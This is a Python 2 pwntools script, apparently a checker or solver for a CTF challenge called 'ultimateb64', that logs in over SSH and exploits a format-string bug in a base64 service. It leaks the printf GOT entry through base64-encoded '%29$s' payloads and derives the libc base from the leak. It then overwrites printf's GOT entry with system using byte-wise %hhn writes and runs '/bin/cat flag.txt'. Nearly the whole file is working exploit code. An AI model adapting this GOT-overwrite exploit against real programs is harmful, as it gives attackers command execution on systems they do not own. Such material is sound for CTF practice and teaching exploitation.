#!/usr/bin/env python2

from pwn import *
import binascii
from base64 import *

context(arch='amd64', os= 'linux')
context.log_level = 'error'

def alive():

	s = ssh(host='ultimateb64.ctf.insecurity-insa.fr',user='ultimateb64', password='ultimateb64', level="error")
	r = s.shell()

	r.recvuntil("b64> ")
	r.sendline("AAAA")
	ret = r.recvuntil("b64> ", timeout=2.0)
	if len(ret) > 0:
		log.info("alive !")
		return True
	else:
		log.info("dead x_x...")
		return False

def dump(addr, r,fmt='p'):
    raw_addr = p64(addr)
    if "\n" in raw_addr:
        return ("","")
    leak_part = "|%29${}|".format(fmt)
    out = leak_part.ljust(129,"A")+"EOF_ubd"+raw_addr
    out_enc = b64encode(out)
    r.sendline(out_enc)
    ret = r.recvuntil("b64> ")
    return ret.split('|')[1], ret

def exploit(r):
	PRINTF_GOT = 0x602040
	offset = 0x055800
	libc = ELF(os.path.dirname(__file__) + "/libc-eea5f41864be6e7b95da2f33f3dec47f.so.6")

	r.recvuntil("b64> ")
	r.sendline("AAAA")
	r.recvuntil("b64> ")
	printf_leak = u64(dump(PRINTF_GOT,r,'s')[0].ljust(8,"\x00"))
	if printf_leak == 0x0 :
		printf_leak = u64(dump(PRINTF_GOT+1,r ,'s')[0].ljust(8,"\x00"))
		printf_leak = printf_leak << 8
	log.info("printf: 0x{:08x}".format(printf_leak))

	libcPtr = printf_leak - offset

	system = libc.symbols["system"] + libcPtr
	log.info("system : "+hex(system))

	ov_sys = system
	byte1 = ov_sys & 0xff
	byte2 = (ov_sys & 0xff00) >> 8
	byte3 = (ov_sys & 0xff0000) >> 16

	if byte1 < byte2:
		if byte2 < byte3:
			#log.info("1,2,3")
			byte1 -= 3
			byte2 -= (byte1+5)
			byte3 -= (byte1+byte2+7)
			pl = "|%29$s|%{}x|%29$hhn|%{}x|%30$hhn|%{}x|%31$hhn".format(byte1,byte2,byte3)
		elif byte1 < byte3:
			#log.info("1,3,2")
			byte1 -= 3
			byte3 -= (byte1+5)
			byte2 -= (byte1+byte3+7)
			pl = "|%29$s|%{}x|%29$hhn|%{}x|%31$hhn|%{}x|%30$hhn".format(byte1,byte3,byte2)
		else:
			#log.info("3,1,2")
			byte3 -= 3
			byte1 -= (byte3+5)
			byte2 -= (byte3+byte1+7)
			pl = "|%29$s|%{}x|%31$hhn|%{}x|%29$hhn|%{}x|%30$hhn".format(byte3,byte1,byte2)
	else:
		if byte1 < byte3:
			#log.info("2,1,3")
			byte2 -= 3
			byte1 -= (byte2+5)
			byte3 -= (byte1+byte2+7)
			pl = "|%29$s|%{}x|%30$hhn|%{}x|%29$hhn|%{}x|%31$hhn".format(byte2,byte1,byte3)
		else :
			if byte2 < byte3:
				#log.info("2,3,1")
				byte2 -= 3
				byte3 -= (byte2+5)
				byte1 -= (byte3+byte2+7)
				pl = "|%29$s|%{}x|%30$hhn|%{}x|%31$hhn|%{}x|%29$hhn".format(byte2,byte3,byte1)
			else:
				#log.info("3,2,1")
				byte3 -= 3
				byte2 -= (byte3+5)
				byte1 -= (byte3+byte2+7)
				pl = "|%29$s|%{}x|%31$hhn|%{}x|%30$hhn|%{}x|%29$hhn".format(byte3,byte2,byte1)

	pl += "|%29$s|"
	out = pl.ljust(129,"A") + "EOF_ubd"
	out += p64(PRINTF_GOT)
	out += p64(PRINTF_GOT+1)
	out += p64(PRINTF_GOT+2)
	out += p64(PRINTF_GOT+3)
	out += p64(PRINTF_GOT+4)
	out_enc = b64encode(out)

	r.sendline(out_enc)
	ret = u64(r.recvuntil("b64> ").split("|AAA")[0][-6:].ljust(8,"\x00"))
	log.info("{}".format(hex(ret)))
	return ret,system

def exploitable():

	s = ssh(host='ultimateb64.ctf.insecurity-insa.fr',user='ultimateb64', password='ultimateb64', level="error")
	r = s.shell()
	ret,system = exploit(r)

	tries = 0
	while ret != system and tries < 5:
		r.close()
		s = ssh(host='ultimateb64.ctf.insecurity-insa.fr',user='ultimateb64', password='ultimateb64', level="error")
		r = s.shell()
		ret,system = exploit(r)
		tries += 1

	if tries == 5 :
		return False
	else:
		out_enc = b64encode("/bin/cat flag.txt")
		r.sendline(out_enc)
		r.recvuntil("out>")
		r.sendline('exit')
		flag = r.recvuntil("b64>")
		if "INSA" in flag :
			log.info("exploitable !")
			return True
		else:
			log.info("unexploitable...")
			return False

if __name__ == "__main__":
	print(alive() and exploitable())
